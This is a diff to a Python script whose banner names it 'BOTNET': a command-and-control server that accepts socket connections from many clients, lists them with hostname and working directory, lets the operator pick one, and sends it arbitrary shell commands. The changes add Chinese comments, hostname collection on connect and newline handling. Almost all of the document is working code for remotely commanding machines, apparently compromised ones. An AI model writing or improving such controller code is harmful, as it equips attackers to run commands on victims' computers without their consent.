@@ -5,8 +5,6 @@ import time
 
 os.system('cls')
 
-version = "v1.0.1"
-
 title = f"""
 BBBBBBBBBBBBBBBBB        OOOOOOOOO     TTTTTTTTTTTTTTTTTTTTTTT   NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTT
 B::::::::::::::::B     OO:::::::::OO   T:::::::::::::::::::::T   N:::::::N       N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
@@ -25,7 +23,7 @@ B:::::::::::::::::B  OO:::::::::::::OO       T:::::::::T         N::::::N       
 B::::::::::::::::B     OO:::::::::OO         T:::::::::T         N::::::N        N::::::NE::::::::::::::::::::E      T:::::::::T
 BBBBBBBBBBBBBBBBB        OOOOOOOOO           TTTTTTTTTTT         NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT
 
-版本: {version}
+版本: {1.2} 修改于2025.5.30
 {'=' * 134}
 """
 
@@ -65,23 +63,23 @@ class ClientManager:
 
     def list_clients(self):
         with self.lock:
-            return list(self.clients.keys())
+            return list(self.clients.keys()) #获取所有已连接客户端的标识符列表
 
     def set_current_client(self, client_id):
         with self.lock:
-            if client_id in self.clients:
+            if client_id in self.clients: #检查客户端是否存在
                 self.current_client = client_id
                 return True
             return False
 
     def get_current_client(self):
         with self.lock:
-            return self.current_client
+            return self.current_client #获取当前正在交互的客户端
 
     def get_client_socket(self, client_id):
         with self.lock:
             client = self.clients.get(client_id)
-            return client.get('socket') if client else None
+            return client.get('socket') if client else None #获取指定客户端的套接字对象，以便后续通过该套接字与客户端进行通信
 
     def update_client_dir(self, client_id, new_dir):
         with self.lock:
@@ -108,9 +106,15 @@ client_manager = ClientManager()
 def handle_client(client_socket, address):
     client_id = client_manager.add_client(client_socket, address)
     try:
+        client_socket.send("hostname\n".encode('utf-8'))
+        hostname = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
+        # 更新客户端信息
+        with client_manager.lock:
+            if client_id in client_manager.clients:
+                client_manager.clients[client_id]['hostname'] = hostname
         while client_manager.is_client_active(client_id):
             try:
-                client_socket.send("pwd".encode('utf-8'))
+                client_socket.send("pwd\n".encode('utf-8'))
                 current_dir = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
                 client_manager.update_client_dir(client_id, current_dir)
             except Exception as e:
@@ -150,7 +154,10 @@ def server_input_handler():
                 for i, client_id in enumerate(clients, 1):
                     prefix = "* " if client_id == current_client else "  "
                     dir_info = client_manager.get_client_dir(client_id)
-                    print(f"{prefix}{i}. {client_id} [目录: {dir_info}]")
+                    # 获取主机名
+                    with client_manager.lock:
+                        hostname = client_manager.clients[client_id].get('hostname', '未知主机')
+                    print(f"{prefix}{i}. {client_id} [主机: {hostname}, 目录: {dir_info}]")
                 print()
                 continue
             if command.lower().startswith('sel '):
@@ -177,14 +184,19 @@ def server_input_handler():
                 continue
             current_client = client_manager.get_current_client()
             if current_client is None:
-                print("\n没有可用的客户端，请先选择或等待客户端连接\n")
+                print("\n没有可用的客户端,请先选择或等待客户端连接\n")
                 continue
             client_socket = client_manager.get_client_socket(current_client)
             if client_socket is None:
                 print("\n当前客户端不可用\n")
                 continue
+                
+            current_client = client_manager.get_current_client()
+            if current_client is None:
+                print("\n没有可用的客户端,请先选择或等待客户端连接\n")
+                continue
             try:
-                client_socket.send(command.encode('utf-8'))
+                client_socket.send((command + "\n").encode('utf-8'))
                 output = client_socket.recv(65536).decode('utf-8', errors='ignore')  # 增大缓冲区
                 if command.lower().startswith('cd '):
                     if "目录已更改为:" in output:
@@ -202,8 +214,18 @@ def server_input_handler():
         except Exception as e:
             print(f"\n处理输入时出错: {e}\n")
 
+#def get_local_ip():
+#    try:
+#        # 创建一个 UDP 套接字（不需要实际连接）
+#        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#        s.connect(('8.8.8.8', 80))  # 连接到谷歌 DNS 服务器
+#        local_ip = s.getsockname()[0]
+#        s.close()
+#        return local_ip
+#    except Exception:
+#        return "127.0.0.1"  # 如果失败返回回环地址
 def start_server():
-    host = '127.0.0.1'
+    host = "127.0.0.1"
     port = 1000
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
